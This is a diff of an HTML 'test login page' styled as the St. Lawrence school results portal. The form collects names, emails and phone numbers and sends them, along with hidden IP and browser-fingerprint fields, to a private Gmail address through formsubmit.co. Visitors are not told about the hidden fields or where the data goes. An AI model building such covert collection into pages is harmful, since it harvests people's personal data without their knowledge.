@@ -3,32 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="keywords" content="Login page,St lawrence,SLANA">
     <title>St Lawrence test login page</title>
     <link rel="stylesheet" href="styles.css">
+    <link rel="shortcut icon" href="badge.jpg"   type="image/x-icon">
+    <link rel="stylesheet" href="https://api.fontshare.com/css?f[]=satoshi@1,300,301,700&f[]=clash-grotesk@1,200,201,600&f[]=quicksand@1,500,600,700&display=swap">
 </head>
+
+<main>
 <body>
-    <div class="logo"></div>
-    <br> <br>
-    <h2>St Lawrence test login page</h2>
+    <div class="badge_and_header">
+    <header>
+       <a href="http://www.stlawrence.ac.ug/" id="hl">
+         <img src="badge.jpg" id="badge">
+         <h2 id="top"> ST. LAWRENCE LOGIN PAGE</h2>
+       </a>
+    </header>
+    </div>
+    
     <div class="top">
-    <p> St Lawrence test for login screen of the login screen for our new <a href="http://www.stlawrence.ac.ug/">website</a></p><br>
-        <p>Please fill your correct details this is aimed at developing our system.</p> <br>
-        <p> Learners will be able to access their exam results via the system by logging in the with their details</p><br>
-        <p> The system is likely to be out by 3rd February 2025</p> <br> 
-        </div> <br> 
+    <p>We are testing the login screen for the new <a href="http://www.stlawrence.ac.ug/" id="text"<b>St.Lawrence</b> website</a> to ensure a seamless user experience.</p>  
+<p>Please provide accurate details during this process.</p>  
+<p>The system will allow learners to securely access their exam results and is expected to go live by <b>3rd February 2025</b>.</p>  
+<p>Thank you for your support!</p>
+</div> <br> 
+
+    <div class="form">  
     <form id="userForm" action="https://formsubmit.co/kesemm74@gmail.com" method="POST" onsubmit="populateBrowserDetails()">
            
         <label for="name">Full Name</label>
-        <input type="text" id="name" name="name" required>
+        <input type="text" id="name" name="name" placeholder="Surname Given-name Other" required>
 
         <label for="email">Email Address</label>
-        <input type="email" id="email" name="email" required>
+        <input type="email" id="email" name="email" placeholder="example@gmail.com" required>
 
         <label for="phone">Phone Number</label>
-        <input type="tel" id="phone" name="phone" required>
+        <input type="tel" id="phone" name="phone" placeholder="0701234567" required>
 
         <label for="message">Your Message</label>
-        <textarea id="message" name="message" required></textarea>
+        <textarea id="message" name="message" placeholder="Example message....."required></textarea>
 
         <!-- Hidden fields for browser details -->
         <input type="hidden" id="ipAddress" name="ipAddress">
@@ -38,16 +51,16 @@
         <input type="hidden" id="platform" name="platform">
         <input type="hidden" id="screenWidth" name="screenWidth">
         <input type="hidden" id="screenHeight" name="screenHeight">
-        <input type="hidden" id="submissionTime" name="submissionTime"><br>
-        
-        <div class="image-container">
-        <img src="IMG_20240819_124831.jpg" alt="St Lawrence">
-    </div><br>
+        <input type="hidden" id="submissionTime" name="submissionTime">
 
-        <button type="submit">Submit</button>
-    </form><br> <br> <br>
-    <small style="align: centre;">From the ICT department of ST Lawrence SSS SONDE. <br> NIHIL IMPOSIBILIS EST CUM DEO <br> copyright© 2024 all rights reserved </small>
+        <button type="submit" class="button">Submit</button>
+        <p id="messageSpace"></p>
+    </form>
+    <br>
+    </div>
+</main>
 
-    <script src="script.js"></script>
 </body>
-</html>
+ <script src="script.js"></script>
+        </html>
+             
